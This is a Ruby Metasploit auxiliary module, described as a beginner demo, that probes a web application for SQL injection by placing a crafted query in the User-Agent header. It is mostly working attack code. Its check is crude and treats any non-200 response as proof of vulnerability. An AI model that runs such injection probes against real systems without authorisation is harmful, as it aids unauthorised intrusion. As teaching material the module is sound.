require 'csv'

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
                      'Name' => 'Esra Demo SQLi',
                      'Description' => '
        This module demonstrates a basic SQL injection vulnerability exploit on a target web application.
        It is intended for beginner-level users to understand the principles of SQL injection attacks.
        The module sends a crafted SQL query via the User-Agent HTTP header and checks if the target is
        vulnerable by analyzing the server response. If the target is found to be vulnerable, the module
        confirms the exploit and reports the vulnerability.
      ',
                      'License' => MSF_LICENSE,
                      'Author' =>
                        [
                          'ESRA NUR SAYIM'
                        ],
                      'References' => [
                        ['CWE', '74'],
                        ['URL', 'https://medium.com/@naoumine']
                      ],
                      'DisclosureDate' => 'June 23 2024'
          ))

    register_options(
      [
        Opt::RPORT(5000),
        OptString.new('TARGETURI', [true, 'The base path to the SQLi demo', '/'])
      ]
    )
  end

  def sqli(query)
    rand = Rex::Text.rand_text_alpha(5)
    query = "#{rand}';#{query};--"
    vprint_status(query)
    res = send_request_cgi({
                             'method' => 'GET',
                             'uri' => normalize_uri(target_uri.path, '/'),
                             'headers' => {
                               'User-Agent' => "#{query}'",
                             }
                           })
    return res
  end

  def check
    res = sqli("'")
    if res && res.code == 200
      Exploit::CheckCode::Safe
    else
      Exploit::CheckCode::Vulnerable
    end
  end

  def run
    unless check == Exploit::CheckCode::Vulnerable
      fail_with Failure::NotVulnerable, 'Target is not vulnerable'
    end

    print_good(" Everything looks ok !")

  end
end